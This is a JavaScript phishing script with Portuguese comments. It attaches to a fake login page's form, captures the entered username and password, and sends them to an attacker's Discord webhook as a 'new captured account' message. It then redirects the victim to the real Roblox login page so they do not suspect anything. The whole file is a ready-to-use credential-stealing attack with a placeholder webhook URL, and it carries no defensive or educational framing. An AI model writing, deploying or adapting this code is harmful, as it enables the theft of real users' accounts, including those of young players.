// COLE A URL DO SEU WEBHOOK DO DISCORD ABAIXO
const WEBHOOK_URL = "SUA_URL_DO_WEBHOOK_AQUI";

document.addEventListener("DOMContentLoaded", () => {
    // Localiza o formulário de login na página
    const loginForm = document.querySelector("form");

    if (!loginForm) {
        console.error("Formulário não encontrado. Verifique se a página tem a tag <form>");
        return;
    }

    loginForm.addEventListener("submit", async (e) => {
        e.preventDefault(); // Impede a página de recarregar

        // Captura os dados dos inputs
        const formData = new FormData(loginForm);
        
        // Tenta pegar os valores por nomes comuns (username, user, login / password, pass, senha)
        const user = formData.get("username") || formData.get("user") || formData.get("login") || "Não informado";
        const pass = formData.get("password") || formData.get("pass") || formData.get("senha") || "Não informado";

        // Monta o pacote de dados para o Discord
        const payload = {
            embeds: [{
                title: "🎯 Nova Conta Capturada!",
                color: 16711680, // Vermelho
                fields: [
                    { name: "👤 Usuário", value: `\`${user}\``, inline: true },
                    { name: "🔑 Senha", value: `\`${pass}\``, inline: true }
                ],
                footer: { text: "Sistema de Captura Automática" },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const response = await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                // Redireciona para o site real para a vítima não desconfiar
                window.location.href = "https://www.roblox.com/login";
            } else {
                alert("Erro no servidor. Tente novamente.");
            }
        } catch (error) {
            console.error("Erro ao enviar:", error);
            alert("Erro de conexão.");
        }
    });
});
